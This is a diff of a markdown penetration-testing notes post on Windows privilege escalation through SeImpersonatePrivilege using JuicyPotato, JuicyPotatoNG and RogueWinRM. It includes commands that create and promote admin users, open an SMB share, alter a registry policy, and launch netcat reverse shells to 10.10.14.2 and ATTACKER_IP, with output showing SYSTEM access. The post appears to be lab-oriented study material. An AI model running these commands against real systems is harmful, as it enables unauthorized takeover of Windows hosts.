@@ -1,4 +1,14 @@
-## JuicyPotato
+---
+description: >-
+  Multiple tools to abuse SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege
+title: SeImpersonatePrivilege             # Add title here
+date: 2022-11-11 08:00:00 -0600                           # Change the date to match completion date
+categories: [04 Privilege Escalation, Windows - SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege]                     # Change Templates to Writeup
+tags: [juicypotato, juicypotatong, roguewinrm, seimpersonateprivilege, seassignprimarytokenprivilege, windows privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
+### JuicyPotato
 
 The tool takes advantage of the **_SeImpersonatePrivilege_** or **_SeAssignPrimaryTokenPrivilege_** if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users. ^80958f
 
@@ -12,13 +22,19 @@ There are few requirements needed for Juicy Potato to work:
 
 As we see in the screenshot below, we have a shell running as — **Kohsuke, and the SeImpersonatePrivilege is enabled.**
 
-![[Pasted image 20221120150443.png]]
+![Description](/assets/img/Pasted image 20221120150443.png)
 
-To escalate, we need to upload the Juicy Potato executable to the compromised machine. A compiled version is available at the tool’s GitHub account [JuicyPotato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
+To escalate, we need to upload the Juicy Potato executable to the compromised machine. A compiled version is available at the tool’s GitHub account:
 
-![](https://miro.medium.com/max/875/1*-E7A_YyZvb228Fo-CHUJ4g.png)
+- [JuicyPotato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 
-![](https://miro.medium.com/max/875/1*b90DNHHOBoKJEyIitAmyxw.png)
+- [JuicyPotato version x86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
+
+The image below shows a way to upload such exploit to the vulnerable machine via powershell:
+![Description](https://miro.medium.com/max/875/1*-E7A_YyZvb228Fo-CHUJ4g.png)
+
+Menu to execute the JuicyPotato executable:
+![Description](https://miro.medium.com/max/875/1*b90DNHHOBoKJEyIitAmyxw.png)
 
 To run the tool, we need a port number for the COM server and a valid CLSID — you can either use the provided list by the tool authors based on the version of the system or run the below PowerShell command to extract the CLSID of the current system.
 
@@ -38,9 +54,8 @@ Write-Host $a.CLSID
 
 ^5756e5
 
+Execution of the previous command:
 ![](https://miro.medium.com/max/875/1*SBFH9QAnkjq4t1UXstTKGw.png)
-
-![](https://miro.medium.com/max/875/1*537pvF7SDTx-B9JD2Dj2UA.png)
 
 Save the Powershell code in a file and run it. Save the output in a file.
 
@@ -48,12 +63,13 @@ Save the Powershell code in a file and run it. Save the output in a file.
 powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
 ```
 
-run the PS script and save the output
+Run the PS script and save the output
 
 ![](https://miro.medium.com/max/875/1*uqLMXFtWZ9F3hls8YTmVRA.png)
 
 In order to execute this command successfully, we can enumerate valid CLSIDs to be used with JuicyPotato.exe, to do so the following script can aid: [test_clsid.bat](http://ohpe.it/juicy-potato/Test/test_clsid.bat)
-```c
+
+```batch
 @echo off
 :: Starting port, you can change it
 set /a port=10000
@@ -71,7 +87,7 @@ FOR /F %%i IN (CLSID.txt) DO (
 
 This script will test all the retrieved CLSIDs and at the end will retrieve only those which were successfully executed Impersonating another user:
 
-```bash
+```powershell
 type result.log
 {0289a7c5-91bf-4547-81ae-fec91a89dec5};NT AUTHORITY\IUSR
 {0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
@@ -117,10 +133,11 @@ Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 [+] CreateProcessWithTokenW OK
 ```
 
-#Note If the user is not created with the previous command then this can be because the CLSID is not working as expected, we might execute the command with another CLSID.
+If the user is not created with the previous command then this can be because the CLSID is not working as expected, we might execute the command with another CLSID.
+{: .prompt-warning }
 
 2.- Adding the user to the Administrators group:
-```bash
+```powershell
 juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators shuciran2 /add" -t *
 Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 ......
@@ -131,7 +148,7 @@ Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 ```
 
 3.- Then we create an SMB Folder which will allow to give permissions to the user we just created:
-```bash
+```powershell
 juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL /add" -t *
 Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 ......
@@ -144,7 +161,7 @@ Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 
 4.- We modify the following registry key in order to allow the system to create another administrator account:
 
-```bash
+```powershell
 juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -t *
 Testing {CBC04AF1-25C7-4A4D-BB78-28284403510F} 1337
 ......
@@ -168,24 +185,24 @@ At this point all that we need to do is execute evilwin-rm with this new user wh
 ### Getting a reverse shell:
 
 It is possible to get a shell abusing of juicypotato:
-```bash
+```powershell
 juicypotato.exe -l 1337 -c "{CBC04AF1-25C7-4A4D-BB78-28284403510F}" -p c:\windows\system32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 443" -t *
 ```
 
-## JuicyPotatoNG (Windows Server 2019)
+### JuicyPotatoNG (Windows Server 2019)
 
 ^ab2891
 
 Downloading this script we can get the same results than JuicyPotato but this works really well for Windows Server 2019 [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)
 
 We need to upload it to the machine and execute it as follows:
-```bash
+```powershell
 JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 1234"
 ```
 Examples:
 [[Scramble#^ee02ee]]
 
-## RogueWinRM
+### RogueWinRM
 
 We can use the web shell or the command injection input to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:
 
@@ -195,29 +212,31 @@ To use RogueWinRM, we first need to upload the exploit to the target machine.
 
 The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
 
-#Note If WinRM is active on the machine (port 5985/tcp) RogueWinRM is not unexploitable. 
+If WinRM is active on the machine (port 5985/tcp) RogueWinRM is not unexploitable. 
+{: .prompt-warning }
 
 If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
 
 Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
 
-```shell
+```bash
 user@attackerpc$ nc -lvp 4442
 ```
 
 And then, use our web shell to trigger the RogueWinRM exploit using the following command:
 
-```shell-session
+```powershell
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 ```
 
-**Note:** The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
+The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
+{: .prompt-info }
 
 The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.
 
 If all was correctly set up, you should expect a shell with SYSTEM privileges:
 
-```bash
+```powershell
 user@attackerpc$ rlwrap nc -lvnp 4442
 Listening on 0.0.0.0 4442
 Connection received on 10.10.175.90 49755
@@ -227,6 +246,3 @@ Microsoft Windows [Version 10.0.17763.1821]
 c:\windows\system32\inetsrv>whoami
 nt authority\system
 ```
-
-
-[JuicyPotatox86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
